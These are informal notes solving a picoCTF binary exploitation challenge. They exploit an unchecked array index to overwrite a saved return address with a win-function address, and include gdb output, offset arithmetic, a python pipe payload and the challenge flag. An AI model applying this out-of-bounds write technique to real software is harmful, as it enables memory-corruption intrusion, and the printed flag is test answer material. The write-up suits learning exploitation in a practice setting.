An unbounded index can point anywhere!

negative index test
No bounds checking lol

checksec
Arch:     i386-32-little - 32bit
RELRO:    Partial RELRO - can overwrite Global offset table :)
Stack:    No canary found -- buffer overflow-able lol
NX:       NX enabled -- no shellcode
PIE:      No PIE (0x8048000) 

from the stack, try to overwrite GOT of exit? with the address of the win function

find the location of 0x804a018 and write 0x80485c6 or 134514118 as its integer value

Will try to get the distance of 0x804a018 from array[0] (lol hopefully this works)

address of arbitrary write:
array[index] = value; 
0x804865c

test the difference of index 0 and -1 & 0 and 1
index 0 - 0xffffc790
index 1 - 0xffffc794
index -1 - 0xffffc78c

nice, 4 byte difference per index.

Get the distance of index 0 to got exit then overwrite with win function

p 0xffffc790 - 0x804a018
= 0xf7fb2778
p 0xf7fb2778/4
= 0x3dfec9de
or 1040107998

try this value as negative input

lol gg :) 

$eax   : 0x080485c6  →  <win+0> push ebp
$ebx   : 0x0804a000  →  0x08049f0c  →  0x00000001
$ecx   : 0x0       
$edx   : 0x0804a018  →  0x08048456  →  <exit@plt+6> push 0x18

pointer to edx will be overwritten with win func :)
lol segfault. 

try to overwrite the location of return address?

location of return address on the stack 0xffffc77c
p 0xffffc790 - 0xffffc77c
20 / 4  = 5
distance from index 0 - 5 lol
this solution worked lol.

maybe the mapping of the libc used is different from the local binary, hence the distance will be affected :(

flag: picoCTF{str1nG_CH3353_1c0aa84b}

Solution:
Send 134514118 & -5

python -c 'print "134514118\n-5"' | ./vuln
